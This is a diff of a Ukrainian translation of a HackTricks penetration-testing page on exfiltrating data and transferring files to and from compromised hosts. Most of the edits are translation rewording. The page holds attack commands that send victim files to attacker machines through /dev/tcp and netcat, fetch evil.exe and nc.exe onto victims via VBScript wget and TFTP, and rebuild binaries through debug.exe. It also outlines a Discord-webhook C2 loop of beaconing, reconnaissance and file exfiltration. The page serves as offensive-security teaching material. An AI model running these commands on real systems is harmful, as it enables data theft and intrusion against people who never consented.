@@ -2,11 +2,18 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Поширені whitelisted домени для exfiltrate інформації
+> [!TIP]
+> Для повного прикладу розміщення loot у `C:\Users\Public` та exfiltrating його за допомогою Rclone, щоб імітувати легітимні резервні копії, перегляньте робочий процес нижче.
 
-Перевірте [https://lots-project.com/](https://lots-project.com/), щоб знайти commonly whitelisted domains, якими можна зловживати
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
 
-## Copy\&Paste Base64
+## Часто дозволені у білому списку домени для exfiltrate інформації
+
+Перевірте [https://lots-project.com/](https://lots-project.com/), щоб знайти поширені домени, додані у білий список, якими можна зловживати
+
+## Копіювання\&Вставка Base64
 
 **Linux**
 ```bash
@@ -45,7 +52,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Завантаження файлів
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer що виводить GET and POSTs (також заголовки)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Модуль Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -102,12 +109,12 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## Webhooks (Discord/Slack/Teams) для C2 & Data Exfiltration
 
-Webhooks — це write-only HTTPS endpoints, які приймають JSON та необов'язкові частини файлів. Їх зазвичай дозволяють для trusted SaaS domains і вони не потребують OAuth/API keys, що робить їх корисними для low-friction beaconing та exfiltration.
+Webhooks — це HTTPS-ендпоїнти лише для запису, які приймають JSON та необов'язкові файлові частини. Зазвичай їх дозволяють для довірених SaaS-доменів і вони не вимагають OAuth/API keys, що робить їх корисними для low-friction beaconing і exfiltration.
 
-Ключові ідеї:
-- Endpoint: Discord використовує https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data з частиною під назвою payload_json, що містить {"content":"..."} та необов'язковою(-ими) частиною(ями) файлу під назвою file.
-- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK підтверджують доставку.
+Key ideas:
+- Ендпоїнт: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data з частиною під назвою payload_json, що містить {"content":"..."} та необов'язковою файловою(ими) частиною(ями) під назвою file.
+- Шаблон циклу оператора: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK підтверджують доставку.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,7 +185,7 @@ Start-Sleep -Seconds 20
 }
 ```
 Примітки:
-- Схожі підходи застосовуються до інших платформ для спільної роботи (Slack/Teams), що використовують incoming webhooks; відкоригуйте URL і JSON схему відповідно.
+- Подібні шаблони застосовуються до інших платформ для співпраці (Slack/Teams), що використовують incoming webhooks; відрегулюйте URL і JSON schema відповідно.
 - Для DFIR артефактів кешу Discord Desktop та відновлення webhook/API див.:
 
 {{#ref}}
@@ -187,12 +194,12 @@ Start-Sleep -Seconds 20
 
 ## FTP
 
-### FTP сервер (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### FTP сервер (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -228,14 +235,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali як сервер
+Kali як server
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Або створіть smb-шару **за допомогою samba**:
+Або створіть smb share **за допомогою samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -260,13 +267,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-У зловмисника має бути запущений SSHd.
+Атакувальник повинен мати SSHd запущеним.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Якщо у жертви є SSH, зловмисник може змонтувати каталог з системи жертви на систему зловмисника.
+Якщо у жертви є SSH, нападник може змонтувати директорію з жертви на машину нападника.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -279,12 +286,12 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Завантажити файл з victim
+### Завантажити файл з жертви
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Завантажити файл на жертву
+### Завантажити файл на victim
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -313,13 +320,13 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Якщо ви можете надсилати дані на SMTP server, ви можете створити SMTP для отримання даних за допомогою python:
+Якщо ви можете надсилати дані на SMTP-сервер, ви можете створити SMTP-сервер для прийому даних за допомогою python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-За замовчуванням в XP і 2003 (в інших його потрібно явно додати під час встановлення)
+За замовчуванням в XP та 2003 (в інших його потрібно явно додавати під час встановлення)
 
 У Kali, **start TFTP server**:
 ```bash
@@ -328,12 +335,12 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP-сервер на python:**
+**TFTP сервер на python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-У **victim**, підключіться до сервера Kali:
+На **victim**, підключіться до Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Програма `debug.exe` не лише дозволяє оглядати бінарні файли, але й має **можливість відновлювати їх з hex**. Це означає, що, надавши hex бінарного файлу, `debug.exe` може згенерувати бінарний файл. Однак важливо зауважити, що debug.exe має **обмеження на збірку файлів розміром до 64 kb**.
+Програма `debug.exe` не лише дозволяє переглядати binaries, але й має **можливість відтворювати їх з hex**. Це означає, що, надавши hex для binary, `debug.exe` може згенерувати binary файл. Однак важливо зазначити, що debug.exe має **обмеження на збирання файлів розміром до 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Скопіюйте та вставте текст у windows-shell, і буде створено файл під назвою nc.exe.
+Потім скопіюйте та вставте текст у windows-shell, і буде створено файл з назвою nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -397,7 +404,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 ## Посилання
 
-- [Discord як C2 та кешовані докази, що залишилися позаду](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
